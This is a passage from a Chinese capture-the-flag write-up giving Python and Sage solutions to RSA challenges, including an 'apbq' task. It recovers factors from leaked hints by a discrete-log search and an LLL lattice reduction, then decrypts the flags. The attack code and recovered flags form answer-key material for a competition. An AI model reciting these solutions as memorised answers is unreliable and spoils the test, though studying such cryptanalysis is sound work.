class=\"line\">u = h // g</span><br><span class=\"line\">v = h % g</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def worker_search(params):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    工作进程函数，用于在指定的r和s范围内搜索c_exponent。</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    r_start, r_end, s_start, s_end, D, b, final, N = params</span><br><span class=\"line\">    for r in range(r_start, r_end):</span><br><span class=\"line\">        target_exponent = r * D</span><br><span class=\"line\">        for s in range(s_start, s_end):</span><br><span class=\"line\">            c_exponent = target_exponent + s</span><br><span class=\"line\">            current = powmod(b, c_exponent, N)</span><br><span class=\"line\">            if current == final:</span><br><span class=\"line\">                return c_exponent</span><br><span class=\"line\">    return None</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def solve_c_parallel(num_processes=4, D_multiplier=2):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    使用多进程并行化搜索c，使得 b^c ≡ final mod N。</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    sqrt_N = iroot(N, 2)[0]</span><br><span class=\"line\">    C_approx = sqrt_N // (g * g)</span><br><span class=\"line\"></span><br><span class=\"line\">    b = powmod(2, g, N)</span><br><span class=\"line\">    final = powmod(b, u, N)</span><br><span class=\"line\"></span><br><span class=\"line\">    for i in range(2, int(C_approx) + 1):</span><br><span class=\"line\">        # 计算D</span><br><span class=\"line\">        D_root, is_exact = iroot(C_approx, 2)</span><br><span class=\"line\">        D = (D_root + 1) * i</span><br><span class=\"line\"></span><br><span class=\"line\">        # 定义r和s的搜索范围，并将r的范围划分为多个块以并行处理</span><br><span class=\"line\">        step = D // num_processes if D &gt; num_processes else 1</span><br><span class=\"line\">        tasks = []</span><br><span class=\"line\">        for p in range(num_processes):</span><br><span class=\"line\">            r_start = p * step</span><br><span class=\"line\">            r_end = (p + 1) * step if p &lt; num_processes - 1 else D</span><br><span class=\"line\">            s_start = 0</span><br><span class=\"line\">            s_end = D</span><br><span class=\"line\">            params = (r_start, r_end, s_start, s_end, D, b, final, N)</span><br><span class=\"line\">            tasks.append(params)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 创建进程池并分配任务</span><br><span class=\"line\">        with mp.Pool(processes=num_processes) as pool:</span><br><span class=\"line\">            results = pool.map(worker_search, tasks)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 检查是否有任何工作进程找到了c_exponent</span><br><span class=\"line\">        for res in results:</span><br><span class=\"line\">            if res is not None:</span><br><span class=\"line\">                print(f&quot;Solution found: c = &#123;res&#125;&quot;)</span><br><span class=\"line\">                return res</span><br><span class=\"line\">    return None</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\">    c = solve_c_parallel()</span><br><span class=\"line\">    if c is not None:</span><br><span class=\"line\">        print(&quot;c:&quot;, c)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 计算A和B</span><br><span class=\"line\">        A = u - c</span><br><span class=\"line\">        B = v + c * g</span><br><span class=\"line\"></span><br><span class=\"line\">        # 求解二次方程x^2 - Bx + A = 0</span><br><span class=\"line\">        discriminant = B * B - 4 * A</span><br><span class=\"line\">        sqrt_discriminant, is_perfect_square = iroot(discriminant, 2)</span><br><span class=\"line\">        if not is_perfect_square or sqrt_discriminant * sqrt_discriminant != discriminant:</span><br><span class=\"line\">            print(&quot;判别式不是完全平方数。&quot;)</span><br><span class=\"line\">            sys.exit(1)</span><br><span class=\"line\"></span><br><span class=\"line\">        x = (B + sqrt_discriminant) // 2</span><br><span class=\"line\">        y = (B - sqrt_discriminant) // 2</span><br><span class=\"line\"></span><br><span class=\"line\">        # 计算a和b</span><br><span class=\"line\">        a_val = x // 2</span><br><span class=\"line\">        b_val = y // 2</span><br><span class=\"line\"></span><br><span class=\"line\">        # 计算p和q</span><br><span class=\"line\">        p = 2 * g * a_val + 1</span><br><span class=\"line\">        q = 2 * g * b_val + 1</span><br><span class=\"line\"></span><br><span class=\"line\">        # 验证p和q是否为素数</span><br><span class=\"line\">        if not is_prime(p):</span><br><span class=\"line\">            print(&quot;p 不是素数。&quot;)</span><br><span class=\"line\">            sys.exit(1)</span><br><span class=\"line\">        if not is_prime(q):</span><br><span class=\"line\">            print(&quot;q 不是素数。&quot;)</span><br><span class=\"line\">            sys.exit(1)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 计算phi(N)</span><br><span class=\"line\">        phi_N = (p - 1) * (q - 1)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 计算私钥指数d</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            d = invert(e, phi_N)</span><br><span class=\"line\">        except ZeroDivisionError:</span><br><span class=\"line\">            print(&quot;e与phi(N)不互质，无法找到逆元。&quot;)</span><br><span class=\"line\">            sys.exit(1)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 解密密文</span><br><span class=\"line\">        m = powmod(C, d, N)</span><br><span class=\"line\">        decrypted_message = long_to_bytes(m)</span><br><span class=\"line\"></span><br><span class=\"line\">        print(&quot;解密消息:&quot;, decrypted_message)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;未找到c的解。&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>Solution found: c = 51589121<br>\nc: 51589121<br>\n 解密消息: b’flag {bf82d1cd-67b1-42bd-a7b5-f119f0246dfe}’</p>\n<p>有原题</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mNjFkLmdpdGh1Yi5pby9jcnlwdG8vUlNBL2h1d2FuZ2JlaTIwMTlfQ3J5cHRvMS8=\">https://f61d.github.io/crypto/RSA/huwangbei2019_Crypto1/</span></p>\n<h2 id=\"apbq\"><a class=\"markdownIt-Anchor\" href=\"#apbq\">#</a> apbq：</h2>\n<p>第一部分</p>\n<p><em>ϕ</em>=<em>n</em>1−<em>h</em>1+1=<em>p</em>×<em>q</em>−(<em>p</em>+<em>q</em>)+1=(<em>p</em>−1)(<em>q</em>−1)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.Util.number import long_to_bytes</span><br><span class=\"line\">from gmpy2 import gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\">hint1 = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span><br><span class=\"line\">n1,e1 = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)</span><br><span class=\"line\">c1 = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span><br><span class=\"line\">phi = n1-hint1+1</span><br><span class=\"line\">d = gmpy2.invert(e1,phi)</span><br><span class=\"line\">m = pow(c1,d,n1)</span><br><span class=\"line\">flag1 =long_to_bytes(m)</span><br><span class=\"line\">print(flag1)</span><br><span class=\"line\">#b&#x27;flag&#123;yOu_can_&#x27;</span><br></pre></td></tr></table></figure>\n<p>第二部分</p>\n<p>想办法因式分解一个 RSA 模数 𝑛=𝑝×𝑞<em>n</em>=<em>p</em>×<em>q</em></p>\n<p>先求出 p,q</p>\n<p>然后定格矩阵<br>\n DownUniderCTF 2023 相似</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Rvd25VbmRlckNURi9DaGFsbGVuZ2VzXzIwMjNfUHVibGljL2Jsb2IvbWFpbi9jcnlwdG8vYXBicS1yc2EtaWkvc29sdmUvc29sdi5zYWdl\">https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/apbq-rsa-ii/solve/solv.sage</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import itertools</span><br><span class=\"line\">from Crypto.Util.number import long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\"># n, c, hints</span><br><span class=\"line\">c = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class=\"line\"></span><br><span class=\"line\">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class=\"line\"></span><br><span class=\"line\">V = hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]</span><br><span class=\"line\"></span><br><span class=\"line\">k = 2^(512 - 180)</span><br><span class=\"line\"></span><br><span class=\"line\">M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V)))</span><br><span class=\"line\">B = [b[1:] for b in M.LLL()]</span><br><span class=\"line\">M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V)))</span><br><span class=\"line\">B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == &#123;0&#125;]</span><br><span class=\"line\"></span><br><span class=\"line\">for s, t in itertools.product(range(100), repeat=2):</span><br><span class=\"line\">    T = s*B[0] + t*B[1]</span><br><span class=\"line\">    a1, a2, a3 = T[0], T[1], T[2]</span><br><span class=\"line\">    kq = gcd(a1 * hints[1] - a2 * hints[0], n)</span><br><span class=\"line\">    if 1 &lt; kq &lt; n:</span><br><span class=\"line\">        print(&#x27;find!&#x27;, kq, s, t)</span><br><span class=\"line\">        break</span><br><span class=\"line\">for i in range(2**16, 1, -1):</span><br><span class=\"line\">    if kq % i == 0:</span><br><span class=\"line\">        kq //= i</span><br><span class=\"line\">q = int(kq)</span><br><span class=\"line\">p = int(n // kq)</span><br><span class=\"line\">print(&#x27;p&#x27;, p)</span><br><span class=\"line\">print(&#x27;q&#x27;,q)</span><br><span class=\"line\">#8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class=\"line\">9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class=\"line\">8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br></pre></td></tr></table></figure>\n<p>得到，p，q 直接解出第二部分</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.Util.number import long_to_bytes</span><br><span class=\"line\">from gmpy2 import gmpy2</span><br><span class=\"line\"># kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class=\"line\">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class=\"line\">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class=\"line\">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class=\"line\">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class=\"line\"></span><br><span class=\"line\">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class=\"line\">m = pow(c2,d,n)</span><br><span class=\"line\">flag2 = long_to_bytes(m)</span><br><span class=\"line\">print(q*p)</span><br><span class=\"line\">print(flag2)</span><br><span class=\"line\"># b&#x27;s0lve_the_@pb&#x27;</span><br></pre></td></tr></table></figure>\n<p>第三部分：</p>\n<p>发现这里可以直接用第二部分的 p， q</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.Util.number import long_to_bytes</span><br><span class=\"line\">from gmpy2 import gmpy2</span><br><span class=\"line\"># # kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class=\"line\">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class=\"line\">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class=\"line\">n, e = 